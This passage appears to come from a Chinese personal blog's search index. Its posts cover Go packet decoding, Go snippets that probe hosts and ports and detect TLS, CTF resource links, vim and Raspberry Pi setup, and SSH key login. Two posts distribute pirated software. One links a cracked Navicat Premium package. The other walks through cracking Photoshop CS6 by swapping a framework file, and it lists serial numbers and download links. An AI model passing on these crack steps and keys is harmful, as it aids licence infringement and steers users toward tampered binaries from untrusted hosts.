packet.Layer(CustomLayerType)\n    if customLayer != nil {\n        fmt.Println(\"Packet was successfully decoded with custom layer decoder.\")\n        customLayerContent, _ := customLayer.(*CustomLayer)\n        // Now we can access the elements of the custom struct\n        fmt.Println(\"Payload: \", customLayerContent.LayerPayload())\n        fmt.Println(\"SomeByte element:\", customLayerContent.SomeByte)\n        fmt.Println(\"AnotherByte element:\", customLayerContent.AnotherByte)\n    }\n}\n```\n\n#### 更快地解码数据包\n\n> 如果我们知道我们要预期的得到的层，我们可以使用现有的结构来存储分组信息，而不是为每个需要时间和内存的分组创建新的结构。使用DecodingLayerParser更快。就像编组和解组数据一样。\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/layers\"\n    \"github.com/google/gopacket/pcap\"\n    \"log\"\n    \"time\"\n)\n\nvar (\n    device       string = \"eth0\"\n    snapshot_len int32  = 1024\n    promiscuous  bool   = false\n    err          error\n    timeout      time.Duration = 30 * time.Second\n    handle       *pcap.Handle\n    // Will reuse these for each packet\n    ethLayer layers.Ethernet\n    ipLayer  layers.IPv4\n    tcpLayer layers.TCP\n)\n\nfunc main() {\n    // Open device\n    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer handle.Close()\n\n    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())\n    for packet := range packetSource.Packets() {\n        parser := gopacket.NewDecodingLayerParser(\n            layers.LayerTypeEthernet,\n            &ethLayer,\n            &ipLayer,\n            &tcpLayer,\n        )\n        foundLayerTypes := []gopacket.LayerType{}\n\n        err := parser.DecodeLayers(packet.Data(), &foundLayerTypes)\n        if err != nil {\n            fmt.Println(\"Trouble decoding layers: \", err)\n        }\n\n        for _, layerType := range foundLayerTypes {\n            if layerType == layers.LayerTypeIPv4 {\n                fmt.Println(\"IPv4: \", ipLayer.SrcIP, \"->\", ipLayer.DstIP)\n            }\n            if layerType == layers.LayerTypeTCP {\n                fmt.Println(\"TCP Port: \", tcpLayer.SrcPort, \"->\", tcpLayer.DstPort)\n                fmt.Println(\"TCP SYN:\", tcpLayer.SYN, \" | ACK:\", tcpLayer.ACK)\n            }\n        }\n    }\n}\n```\n\n#### TCP流重组\n\n> gopacket包提供了一些名为Flow和Endpoint的类型。我没有机会深入探索这些文档，但文档中有一个使用它来将特定TCP流发送到数据包通道的示例。[https://godoc.org/github.com/google/gopacket](https://godoc.org/github.com/google/gopacket)\n\n\n\n### 4. 简述\n\n写这篇博文是因为gopacket这个包资料案例不是很多，百度上唯一一篇质量还可以的文章是来自[虾米的博客](https://blog.csdn.net/ptmozhu/article/details/72652310) 发布在CSDN上的一篇关于gopacket的golang语言代码实现的文章，但是CSS出现问题，导致阅读障碍，为了防止文章资源丢失，这里特此将文章内容通过更简洁的方式重写，并在后期针对于对Google推出的 [GoPacket包](https://godoc.org/github.com/google/gopacket) 的理解续写这篇文章，感谢作者 [@ptmozhu](https://blog.csdn.net/ptmozhu) 提供的精彩文章内容。\n\n\n\n","tags":["网络分析"],"categories":["Golang 编程"]},{"title":"Navicat Premium v12.0.4 Cracked 汉化破解版","url":"%2F2018%2F06%2F17%2FNavicat-Premium-v12-0-4-Cracked-%E6%B1%89%E5%8C%96%E7%A0%B4%E8%A7%A3%E7%89%88%2F","content":"\n## Navicat Premium v12.0.4 Cracked 汉化破解版 （直装安装包+汉化包）\n\n人狠话不多\n\n### 破解包\n\n下载路径:  [http://shatel.cdn.p30download.com/p30dl-mac/Navicat.Premium.v12.0.4.MacOSX_p30download.com.dmg](http://shatel.cdn.p30download.com/p30dl-mac/Navicat.Premium.v12.0.4.MacOSX_p30download.com.dmg)\n\n### 汉化包\n\n下载路径：https://pan.baidu.com/s/1kUCeCmj\n\n提取码：x9w4\n\n### 操作过程\n\n破解包直接安装即可，汉化包，请解压找到 `zh-Hans.lproj` ，拷贝到 `/Applications/Navicat Premium.app/Contents/Resources `  中，重启Navicat。\n\n> 简单 粗暴 ！","tags":["汉化"],"categories":["MacOS 笔记"]},{"title":"Hexo+Coding.me搭建稳点免费的静态个人博客","url":"%2F2018%2F06%2F14%2FHexo%E4%B8%8Ecoding-me%E6%90%AD%E5%BB%BA%E7%A8%B3%E7%82%B9%E5%85%8D%E8%B4%B9%E7%9A%84%E9%9D%99%E6%80%81%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F","content":"\n## Hexo+Coding.me搭建稳点免费的静态个人博客\n\n### 安装过程\n\n自行百度\n\n### 部署Hexo博客到Coding.me\n\n首先你要登录 [http://Coding.me](http://Coding.me/) 然后访问 [https://coding.net/user/projects](https://coding.net/user/projects) 添加博客。\n\n项目名称填写如下：\n\n```\n<username>.coding.me\n```\n\n例如我的：\n\n```\nlfoder.coding.me\n```\n\n项目名称填写你的域名，这里使用的是Coding提供的二级域名。\n\n勾选 `启用 README.md 文件初始化项目`\n\n其他选项，请随意。\n\n然后点 `新建项目`\n\n然后再访问 [https://coding.net/user/projects](https://coding.net/user/projects) 点击选择你创建的项目。\n\n- 开启Pages服务\n\n左边选择  代码 => Pages 服务 => 静态 Pages => 部署来源 => 选择你的master分支 => 保存 \n\n当然你也可以开启下面的 `强制HTTPS访问` 服务 (可选)\n\n- 部署公钥\n\n左边选择  设置 => 部署公钥 => 新建部署公钥\n\n然后回到你本机 (我的系统是MacOS，Windows未测) 使用 `ssh-keygen -t rsa` 命令 一路回车，即可生成公钥。\n\n然后使用 `cat ~/.ssh/id_rsa.pub` 来获取你的公钥。\n\n回到浏览器你刚才**新建部署公钥**的地方，在公钥内容中填写你的公钥，并勾选**授予推送权限**，其他请随意，确认即可。\n\n然后回到你的博客目录，找到 `_config.yml` 文件，编辑它！\n\n内容部分参考这里照葫芦画瓢：\n\n```\ndeploy:\n  type: git\n  branch: master\n  repo:\n    - git@github.com:lfoder/lfoder.github.io.git\n    - git@git.coding.net:lfoder/lfoder.coding.me.git\n```\n\nrepo是仓库列表，下面两个分别是Github的仓库和Coding的仓库，这个瓢你可以这么画:\n\n```\ngit@<仓库托管网站域名>:<账户名>/<项目名>.git\n```\n\n然后画好了按照这个格式，写到你的 `_config.yml` 文件中。\n\n此时编辑你的博客，使用 `hexo s` 来预览效果，使用 `hexo d -G` 来上传到两个托管平台。\n\n过一小会儿...\n\n你就会发现两个平台都已经有你的博客了。\n\n访问地址分别是：\n\nGithub =>  [http://lfoder.github.io](http://lfoder.github.io)\n\nCoding => [http://lfoder.coding.me](http://lfoder.github.io)\n\n\n\nHave fun !!","categories":["Hexo 笔记"]},{"title":"Golang编写判断IP是否能够Ping通","url":"%2F2018%2F06%2F07%2FGolang%E7%BC%96%E5%86%99%E5%88%A4%E6%96%ADIP%E6%98%AF%E5%90%A6%E8%83%BD%E5%A4%9FPing%E9%80%9A%2F","content":"\n人狠话不多，请看代码：\n\n```go\npackage main\n\nimport (\n\t\"time\"\n\t\"net\"\n\t\"fmt\"\n)\n\nfunc isping(ip string) (bool) {\n\trecvBuf1 := make([]byte, 2048)\n\tpayload:=[]byte{0x08,0x00,0x4d,0x4b,0x00,0x01,0x00,0x10,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69}\n\tTime, _ := time.ParseDuration(\"3s\")\n\tconn, err := net.DialTimeout(\"ip4:icmp\", ip,Time)\n\tif err !=nil {\n\t\tfmt.Println(\"bibi\")\n\t\treturn false\n\t}\n\t_,err=conn.Write(payload)\n\tif err !=nil {\n\t\treturn false\n\t}\n\tconn.SetReadDeadline(time.Now().Add(time.Second * 2))\n\tnum, err := conn.Read(recvBuf1[0:])\n\tif err !=nil {\n\t\t//check 80 3389 443 22 port\n\t\tTimetcp, _ := time.ParseDuration(\"1s\")\n\t\tconn1, err := net.DialTimeout(\"tcp\", ip+\":80\",Timetcp)\n\t\tif err == nil {\n\t\t\tdefer conn1.Close()\n\t\t\treturn true\n\t\t}\n\n\t\tconn2, err := net.DialTimeout(\"tcp\", ip+\":443\",Timetcp)\n\t\tif err == nil {\n\t\t\tdefer conn2.Close()\n\t\t\treturn true\n\t\t}\n\n\t\tconn3, err := net.DialTimeout(\"tcp\", ip+\":3389\",Timetcp)\n\t\tif err == nil {\n\t\t\tdefer conn3.Close()\n\t\t\treturn true\n\t\t}\n\n\t\tconn4, err := net.DialTimeout(\"tcp\", ip+\":22\",Timetcp)\n\t\tif err == nil {\n\t\t\tdefer conn4.Close()\n\t\t\treturn true\n\t\t}\n\n\t\treturn false\n\t}\n\tconn.SetReadDeadline(time.Time{})\n\tif string(recvBuf1[0:num]) !=\"\" {\n\t\treturn  true\n\t}\n\treturn false\n\n}\n\nfunc main()  {\n\tip := \"172.8.47.213\"\n\tfmt.Println(isping(ip))\n}\n```\n\n","tags":["Ping"],"categories":["Golang 编程"]},{"title":"Golang编写通过CIDR遍历IP地址","url":"%2F2018%2F06%2F07%2FGolang%E7%BC%96%E5%86%99%E9%80%9A%E8%BF%87CIDR%E9%81%8D%E5%8E%86IP%E5%9C%B0%E5%9D%80%2F","content":"\n人狠话不多，请看代码：\n\n```go\npackage main\n\nimport (\n\t\"net\"\n\t\"fmt\"\n)\n\nfunc hosts(cidr string) ([]string, error) {\nip, ipnet, err := net.ParseCIDR(cidr)\nif err != nil {\nreturn nil, err\n}\n\nvar ips []string\nfor ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {\nips = append(ips, ip.String())\n}\nreturn ips[1 : len(ips)-1], nil\n}\n\nfunc inc(ip net.IP) {\n\tfor j := len(ip) - 1; j >= 0; j-- {\n\t\tip[j]++\n\t\tif ip[j] > 0 {\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc main()  {\n\thosts, _ := hosts(\"192.168.11.9/27\")\n\tfor _, ip := range hosts {\n\t\t fmt.Println(\"sent: \" + ip)\n\t}\n}\n```\n\n","tags":["遍历生成IP"],"categories":["Golang 编程"]},{"title":"Golang编写检测端口是否为HTTPS","url":"%2F2018%2F06%2F07%2FGolang%E7%BC%96%E5%86%99%E6%A3%80%E6%B5%8B%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E4%B8%BAHTTPS%2F","content":"\n\n\n人狠话不多，请看代码:\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\t\"net\"\n\t\"strconv\"\n\t\"os\"\n)\n\nfunc main(){\n\tt:=[]byte{0x16,0x03,0x01,0x00,0xb5,0x01,0x00,0x00,0xb1,0x03,0x03,0xb2,0xd3,0x4d,0xfd,0x63,0xbe,0x89,0xdb,0xe5,0x46,0xcc,0xaf,0x39,0x6e,0xba,0x63,0x63,0x75,0xce,0x30,0xda,0xe0,0x4f,0xab,0xa2,0x3e,0x50,0xea,0x41,0x20,0x10,0xc4,0x00,0x00,0x18,0xc0,0x2b,0xc0,0x2f,0xc0,0x2c,0xc0,0x30,0xc0,0x13,0xc0,0x14,0x00,0x9c,0x00,0x9d,0x00,0x2f,0x00,0x35,0x00,0x0a,0x00,0xff,0x01,0x00,0x00,0x70,0x00,0x00,0x00,0x15,0x00,0x13,0x00,0x00,0x10,0x77,0x77,0x77,0x2e,0x73,0x6f,0x2d,0x63,0x6f,0x6f,0x6c,0x73,0x2e,0x63,0x6f,0x6d,0x00,0x0b,0x00,0x04,0x03,0x00,0x01,0x02,0x00,0x0a,0x00,0x06,0x00,0x04,0x00,0x17,0x00,0x18,0x00,0x23,0x00,0x00,0x00,0x0d,0x00,0x20,0x00,0x1e,0x06,0x01,0x06,0x02,0x06,0x03,0x05,0x01,0x05,0x02,0x05,0x03,0x04,0x01,0x04,0x02,0x04,0x03,0x03,0x01,0x03,0x02,0x03,0x03,0x02,0x01,0x02,0x02,0x02,0x03,0x00,0x05,0x00,0x05,0x01,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x01,0x01,0x00,0x10,0x00,0x0b,0x00,0x09,0x08,0x68,0x74,0x74,0x70,0x2f,0x31,0x2e,0x31}\n\n\tTarget:=\"115.239.210.27\"\n\tport:=443\n\tTime, _ := time.ParseDuration(\"1s\")\n\tconn, err := net.DialTimeout(\"tcp\", Target+\":\"+strconv.Itoa(port), Time )\n\n\tif err != nil {\n\t\tfmt.Println(\"ERR::\" + strconv.Itoa(port) + \">\" + err.Error())\n\t\tos.Exit(1)\n\t}\n\tconn.Write(t)\n\trecvBuf := make([]byte, 2048)\n\tconn.SetReadDeadline(time.Now().Add(time.Second * 2))\n\t_, err = conn.Read(recvBuf[:])\n\tconn.SetReadDeadline(time.Time{})\n\tfmt.Println(\"tlsinfo:\")\n\tfmt.Println( string(recvBuf[:]))\n\tif string(recvBuf[0:4]) == string([] byte {22,3,3,0}) {\n\t\tfmt.Println(\"this is tls ^_^\")\n\t}else{\n\t\tfmt.Println(\"this is not tls\")\n\t}\n\tconn.Close()\n}\n```\n\n","tags":["HTTPS"],"categories":["Golang 编程"]},{"title":"iTunes备份iPhone系统在MacOS上的备份文件路径","url":"%2F2018%2F06%2F06%2FiTunes%E5%A4%87%E4%BB%BDiPhone%E7%B3%BB%E7%BB%9F%E5%9C%A8MacOS%E4%B8%8A%E7%9A%84%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%2F","content":"\n\n\nMacOS 的存储空间相当有限，用来存储iPhone的手机备份相当浪费，一个备份20多个G，伤不起.... 于是有了本文。\n\n\n\n最简单的找到备份文件位置的方法：\n\n```bash\ncd ~/Library/Application\\ Support/MobileSync/Backup\nopen .\n```\n\n此时弹出MacOS的Finder窗口，有一个Backup文件夹，这里面就是iPhone通过iTunes在MacOS上的备份文件路径，你可以拷贝到移动硬盘上以节省空间。","tags":["iTunes"]},{"title":"CTF比赛训练路线全导航","url":"%2F2018%2F06%2F05%2FCTF%E6%AF%94%E8%B5%9B%E8%AE%AD%E7%BB%83%E8%B7%AF%E7%BA%BF%E5%85%A8%E5%AF%BC%E8%88%AA%2F","content":"\n\n\n### CTF资讯信息\n\n#### CTF 比赛资讯\n- [XCTF社区](https://www.xctf.org.cn/)\n- [CTFTime](https://www.ctftime.org)\n- [CTFRank](https://www.ctfrank.org/)\n\n#### 全球安全信息资讯\n\n##### 国内安全资讯\n\n- [Freebuf](http://www.freebuf.com)\n- [知道创宇](https://www.seebug.org/)\n- [SOBUG](http://www.sebug.org/)\n- [Sec-News](https://wiki.ioin.in/)\n- [嘶吼](http://www.4hou.com/)\n- [先知白帽社区](https://xz.aliyun.com/)\n##### 国外安全资讯\n\n- [SecurityTracker](https://securitytracker.com/)\n- [SecurityFocus](https://www.securityfocus.com/)\n- [SecurityVulns](http://securityvulns.com/)\n- [SecuriTeam](http://www.securiteam.com/)\n- [PacketStormSecurity](https://packetstormsecurity.com/)\n- [BlackMoreOps](https://www.blackmoreops.com/)\n- [TechGenix](http://techgenix.com/top-tech-news/)\n\n### CTF综合训练营\n\n#### 国内CTF训练营\n\n- [BugKu](http://ctf.bugku.com/)\n- [南京邮电大学网络攻防训练平台](http://ctf.nuptsast.com/)\n- [SniperOJ](http://www.sniperoj.com/)\n- [Jarvisoj](https://www.jarvisoj.com/)\n- [黑客丛林之旅](http://www.fj543.com/hack/)  \n- [梦之光芒](http://monyer.com/game/game1/)\n- [XCTF_OJ竞赛平台](http://oj.xctf.org.cn/)\n- [白帽学院](http://www.baimaoxueyuan.com/ctf)\n- [i春秋CTF训练营](https://www.ichunqiu.com/battalion)\n- [合天网安实验室CTF训练平台](http://www.hetianlab.com/CTFrace.html)\n- [实验吧CTF训练平台](http://www.shiyanbar.com/ctf/practice)\n- [CTF WiKi](https://ctf-wiki.github.io/ctf-wiki/introduction/resources/)\n- [CTFLearn](https://ctflearn.com/)\n\n#### 国外CTF训练营\n\n- [WeChall.Net](http://www.wechall.net/)\n- [WarGame.Kr](http://wargame.kr/)\n- [WebHacking.Kr](http://webhacking.kr/)\n- [CoolShell.cn](http://fun.coolshell.cn/)\n- [SdsLabs.co](https://backdoor.sdslabs.co/)\n- [SmashTheStack](http://smashthestack.org/)\n\n#### CTF Writeup 知识库\n\n- [安全客CTF攻略](http://bobao.360.cn/ctf/)\n- [Github CTFs WriteUp](https://github.com/ctfs/)\n- [Github CTF WriteUp P4-Team](https://github.com/p4-team/ctf)\n- [Yka.me](http://yka.me/#!index.md)\n- [VulnHub-CTFTime](https://github.com/VulnHub/ctf-writeups)\n- [Capture the Flag](http://captf.com/)\n- [Blue-Lotus](http://www.blue-lotus.net/)\n- [Oops.Net](http://blog.0ops.net/)\n- [ProgramLife](http://www.programlife.net/category/ctf)\n- [Bl4ck.in](https://bl4ck.in/)\n\n### CTF分项训练营\n\n#### 逆向 Reverse\n\n- [吾爱破解论坛 2014 CrackMe安全挑战赛](https://www.52pojie.cn/forum-67-1.html)\n- [吾爱破解论坛 2016 CrackMe安全挑战赛](https://www.52pojie.cn/forum-71-1.html)\n- [看雪技术论坛 CTF安全挑战赛](https://ctf.pediy.com/) \n- [看学技术论坛知识库](https://www.kanxue.com/chm.htm)\n- [Reversing.Kr](http://reversing.kr/)\n- [Pwnable.Kr](http://pwnable.kr/)\n- [Exploit Exercises](https://exploit-exercises.com/)\n- [OverTheWire](http://overthewire.org/wargames/)\n- [Modern Binary Exploitation](http://security.cs.rpi.edu/courses/binexp-spring2015/)\n- [SoftWare-Security-Learning](https://github.com/CHYbeta/Software-Security-Learning)\n\n#### Pwn\n\n- [PwnHub](http://pwnhub.cn/)\n\n#### Web攻防\n\n##### SQLi 注入\n\n- [SQLi-Labs](https://github.com/Audi-1/sqli-labs)\n- [OverTheWire - SQLi](http://redtiger.labs.overthewire.org/)\n\n##### XSS 跨站攻击\n\n- [Prompt.ML](http://prompt.ml/0)\n- [XSS Challenges](http://xss-quiz.int21h.jp/)\n- [Alert(1) To Win](https://alf.nu/alert1)\n- [GitHub XSS Papers](https://github.com/evilcos/papers)\n- [TheSpanner.co.uk](http://www.thespanner.co.uk/)\n- [XSS'OR](http://xssor.io/)\n- [Web-Security-Learning](https://github.com/CHYbeta/Web-Security-Learning)\n\n#### Misc 脑洞\n\n- [Misc & Tools](http://www.ussrback.com/archives/Misc%20&%20tools/)\n\n### CTF 学习路线\n\n- [漏洞银行技能树](https://skills.bugbank.cn/)\n- [GitHub 安全学习脑图](https://github.com/phith0n/Mind-Map)\n- [安全技能树简版](http://evilcos.me/security_skill_tree_basic/index.html)\n- [知道创宇技能树](http://blog.knownsec.com/Knownsec_RD_Checklist/index.html)\n- [360补天平台 - 白帽众学](https://butian.360.cn/School/index)\n- [CTF赛棍夺旗经验分享](http://toutiao.secjia.com/ctf-game-experience)\n\n### CTF 刷题常用工具集\n- [CTF在线工具集(SSLEyes)](http://ctf.ssleye.com/)\n- [CTF在线工具集(BugKu)](http://tool.bugku.com/)\n- [看雪逆向工具](https://tools.pediy.com/)\n- [CTFTools](https://www.ctftools.com/down/)\n- [CTF Tools for Github](https://github.com/zardus/ctf-tools)\n- [s0ftpj.org](http://www.s0ftpj.org/)\n- [UssrBack](http://www.ussrback.com/files.html)\n- [Soldierx - Tools](https://www.soldierx.com/Tools)","tags":["CTF"],"categories":["CTF竞赛"]},{"title":"Adobe Photoshop CS6 for Mac (支持Retina屏) 官方简体破解版","url":"%2F2018%2F05%2F19%2FAdobe-Photoshop-CS6-for-Mac-%E6%94%AF%E6%8C%81Retina%E5%B1%8F-%E5%AE%98%E6%96%B9%E7%AE%80%E4%BD%93%E7%A0%B4%E8%A7%A3%E7%89%88%2F","content":"\n**Adobe PhotoShop CS6 for Mac特别说明**\n\n1.如果想要Photoshop Extended 版本，你需要在替换amtlb.framework 之前先启动 PS 至少一次，然后退出，再替换破解版的amtlb.framework。\n\n2.根据 Adobe 的 FAQ，Adobe cs6大师版的一些程序并不提供试用版，而是必须提供序列号才可启动程序的高级功能，因此需要填写序列号。\n\n把这些需要序列号才能运行的程序还原回amtlib.framework 的原版；断网，启动程序，填入序列号，并选择“稍后连接”（**序列号：1325-0949-2080-9819-3777-3230 或者1325-0160-5283-9851-2671-8951**），退出，替换破解的 amtlib.framework；这类程序包括 distiller 和 aftereffects。\n\n**Photoshop CS6破解补丁下载：**[www.jb51.net/softs/135369.html](http://www.jb51.net/softs/135369.html)\n\n详细的介绍不用多说了，相信大家都知道自己要下载的软件是什么，下面将为大家介绍一下安装与破解的方法：\n\n1、安装前先断网\n\n如果不断网的话还需要先申请一个Adobe ID，是免费申请\n\n2、开始安装，选择“试用”，然后就开始安装了，一直等到安装完毕。\n\n![](http://files.jb51.net/file_images/article/201406/20140612102541111.png)\n\n3、断网状态打开PS，（先联网还是会让输入ADOBE 的id和密码的）然后再联网，点击“帮助”，然后点“更新”，在线下载Retina补丁然后安装。\n\n4、下载破解补丁，解开压缩。\n\n5、在“应用程序”文件夹，找到Adobe Photoshop CS6文件夹,在里面找到Adobe Photoshop CS6.app，右键，选择“显示包内容”，如下图所示：\n\n![](http://files.jb51.net/file_images/article/201406/20140612102541112.jpg)\n\n6、然后找到contents/framework文件夹，把刚才下载并解压的amtlib.framework拷贝进去，替换原文件。\n\n![img](http://files.jb51.net/file_images/article/201406/20140612102541113.jpg)\n\n7、支持Retina屏的PHOTOSHOP CS6 MAC版破解就完成了。\n\n如果提示关闭对8号字体和更小字体的文本平滑处理，请点击：系统偏好设置－通用。\n\n![img](http://files.jb51.net/file_images/article/201406/20140612102541114.png)\n\n按上图设置就ok了。\n\n到此就完成了，如下图：\n\n![img](http://files.jb51.net/file_images/article/201406/20140612102541115.png)\n\n\n\n下载地址：\n\nhttps://pan.baidu.com/s/1qWnZaMw","tags":["PhotoShop"]},{"title":"MacOS下vim爬坑笔记","url":"%2F2018%2F05%2F16%2FMacOS%E4%B8%8Bvim%E7%88%AC%E5%9D%91%E7%AC%94%E8%AE%B0%2F","content":"\n\n\n## MacOS下的VIM爬坑笔记\n\n### 安装 \n\n```\nbrew install vim\n```\n\n### 配置\n\nMacOS下的vim配置文件 `vimrc` 在 `/usr/share/vim/vimrc` 这个位置。\n\n以下是我的配置：\n\n```\n\" Configuration file for vim\nset modelines=0     \" CVE-2007-2438\n\n\" Normally we use vim-extensions. If you want true vi-compatibility\n\" remove change the following statements\nset nocompatible    \" Use Vim defaults instead of 100% vi compatibility\nset backspace=2     \" more powerful backspacing\n\n\" Don't write backup file if vim is being called by \"crontab -e\"\nau BufWrite /private/tmp/crontab.* set nowritebackup nobackup\n\" Don't write backup file if vim is being called by \"chpass\"\nau BufWrite /private/etc/pw.* set nowritebackup nobackup\n\n\n\" Custom Configure Start\n\n\" 自动检测语法高亮\nsyntax on\n\" Tab替换为4个空格\nset ts=4\nset expandtab\n\" 搜索结果高亮 (取消方法  :nohls)\nset hlsearch\n\n\" Custom Configure End\n```\n\n\n\n### 插件\n\n#### 安装插件管理器\n\nvim插件管理工具可以让插件安装变得简单快捷，vim的插件管理工具也有很多，这里选用 [vim-pathogen](https://github.com/tpope/vim-pathogen) （<https://github.com/tpope/vim-pathogen>），安装很简单\n\n```\nmkdir -p ~/.vim/autoload ~/.vim/bundle\n```\n\n下载 vim-pathogen 到 ~/.vim/autoload\n\n```\ncurl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim \n```\n\n编辑  `/usr/share/vim/vimrc`  ，加入如下几行内容：\n\n\n```\nexecute pathogen#infect()\nsyntax on\nfiletype plugin indent on\n```\n\n重启vim 即可安装成功，之后如果想要安装其他插件，只需把插件放到 ~/.vim/bundle 目录下， 重启vim ，vim-pathogen就会帮你自动安装好插件。例如安装\n\nmarkdown：\n\n```\ncd ~/.vim/bundle/\ngit clone https://github.com/plasticboy/vim-markdown.git\n```\n\n然后重启vim即可\n\n\n\n#### 添加 vim-go 插件\n\nvim-go 是一款go代码高亮和语法检查的插件\n\n如上所示安装方法，clone vim-go 到 ~/.vim/bundle 目录下即可\n\n```\ncd ~/.vim/bundle/\ngit clone https://github.com/fatih/vim-go.git\n```\n\n\n\nVia:https://blog.csdn.net/zhang197093/article/details/78559903?locationNum=5&fps=1\n\n> 启动vim出现错误：\n\n```\nvim-go requires Vim 7.4.1689 or Neovim, but you're using an older version.\nPlease update your Vim for the best vim-go experience.\nIf you really want to continue you can set this to make the error go away:\n    let g:go_version_warning = 0\nNote that some features may error out or behave incorrectly.\nPlease do not report bugs unless you're using Vim 7.4.1689 or newer.\n\nPress ENTER or type command to continue\n```\n\n> 解决方案：\n\n添加 `let g:go_version_warning = 0` 到 vimrc文件中。","tags":["vim"]},{"title":"树莓派配置配置VNC服务并开机启动","url":"%2F2018%2F05%2F12%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AEVNC%E6%9C%8D%E5%8A%A1%E5%B9%B6%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%2F","content":"\n首先进入SSH进入树莓派系统\n\n```bash\nsudo raspi-config\n```\n\n进入树莓派配置页面\n\n选择 第5项  **5 Interfacing Options**，回车进入\n\n然后选择第3项 **P3 VNC**， 回车进入，选择 `yes`\n\n然后Finish  重启树莓派 SSH 登录。\n\n开始配置树莓派VNC服务启动脚本\n\n```\nsudo vim /etc/init.d/vncserver\n```\n\n```\n#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          vncserver\n# Required-Start:    $local_fs\n# Required-Stop:     $local_fs\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: Start/stop vncserver\n### END INIT INFO\n \n# More details see:\n# http://www.penguintutor.com/linux/vnc\n \n### Customize this entry\n# Set the USER variable to the name of the user to start vncserver under\nexport USER='pi'\n### End customization required\n \neval cd ~$USER\n \ncase \"$1\" in\n  start)\n    # 启动命令行。此处自定义分辨率、控制台号码或其它参数。\n    su $USER -c '/usr/bin/vncserver -depth 16 -geometry 1024x768 :1'\n    echo \"Starting VNC server for $USER \"\n    ;;\n  stop)\n    # 终止命令行。此处控制台号码与启动一致。\n    su $USER -c '/usr/bin/vncserver -kill :1'\n    echo \"vncserver stopped\"\n    ;;\n  *)\n    echo \"Usage: /etc/init.d/vncserver {start|stop}\"\n    exit 1\n    ;;\nesac\nexit 0\n```\n\n写入以上内容，保存退出。\n\n然后 修改权限\n\n```\nsudo chmod 755 /etc/init.d/vncserver\n```\n\n然后 添加开机启动项\n\n```\nsudo update-rc.d vncserver defaults\n```\n\n最后 重启树莓派\n\n```\nsudo reboot\n```\n\n\n\n","tags":["Raspberry Pi"],"categories":["Raspberry Pi 笔记"]},{"title":"SSH无密码登录 - authorized_keys认证登录","url":"%2F2018%2F05%2F12%2FSSH%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95-authorized-keys%E8%AE%A4%E8%AF%81%E7%99%BB%E5%BD%95%2F","content":"\n\n\n1、ssh-keygen做密码验证可以使在向对方机器上ssh ,scp不用使用密码.具体方法如下:\n2、两个节点都执行操作：\n\n**#ssh-keygen -t rsa**\n 然后全部回车,采用默认值.\n3、这样生成了一对密钥，存放在用户目录的~/.ssh下。\n**将公钥考到对方机器的用户目录下**，并将其复制到~/.ssh/authorized_keys中（操作命令：**#cat id_dsa.pub >> ~/.ssh/authorized_keys**）。\n\n4、设置文件和目录权限：\n\n设置authorized_keys权限\n$ chmod 600 authorized_keys \n设置.ssh目录权限\n$ chmod 700 -R .ssh\n\n 5、要保证.ssh和authorized_keys都只有用户自己有写权限。否则验证无效。（今天就是遇到这个问题，找了好久问题所在），其实仔细想想，这样做是为了不会出现系统漏洞。\n\n \n\n> 资源来自：https://blog.csdn.net/xiaoyida11/article/details/51557174","tags":["SSH证书登录"],"categories":["Linux 笔记"]},{"title":"树莓派系统的安装与配置","url":"%2F2018%2F05%2F12%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F","content":"\n### 树莓派系统的安装与配置\n\n#### 下载 Raspberry Pi 系统\n\nhttps://www.raspberrypi.org/downloads/\n\n下载完成后是一个zip压缩文件，解压出来成为一个拓展名为 `.img`  的文件\n\n#### 烧写树莓派系统到内存卡\n\n首先你需要一个读卡器，很庆幸翻箱倒柜找到一枚N年前还是USB2.0的读卡器，谢天谢地。\n\n然后我的测试环境是 `MacOS` ，使用的烧录软件是 `Etcher` ，这是一个烧写磁盘镜像的工具，Windows上有很多烧写磁盘的工具，具体自己找吧…   都有异曲同工之妙。\n\n步骤很简单，界面如下：\n\n![](https://ws2.sinaimg.cn/large/006tKfTcgy1fr8mnbp8akj318g0l40sw.jpg)\n\n左边一个 选择好你刚才下载解压出来的img镜像文件，中间一个选择你要烧写的目标磁盘或内存卡 (默认会自动选择可移动磁盘或内存卡，不会选择系统磁盘，可放心使用)， 第三个` Flash！` 就是烧写操作，前两项选择完毕以后第三项`Flash！`以后就开始烧写了。\n\n首先**烧写之前**右上角设置小齿轮里最好关掉所有选择项，慢慢你就懂了... \n\n![](https://ws3.sinaimg.cn/large/006tKfTcgy1fr8msj6141j318g0l40t3.jpg)\n\n然后根据上面的步骤开始烧写磁盘。\n\n烧写完毕。树莓派系统就已经做好了。此时还没有结束。\n\n#### 树莓派开机自动启动SSH服务\n\n在树莓派系统的内存卡根目录中，创建一个名为 `ssh`  的空文件，这样做的目的是为了在树莓派系统启动时自动启动 ssh 服务，插上网线，重启之。\n\n用自己的电脑执行 `sudo nmap -sn 192.168.1.1/24 `  扫描树莓派所在的网段，我是在MacOS下执行的，得加sudo，执行结果如下：\n\n   ```\n   lfoder in ~ λ sudo 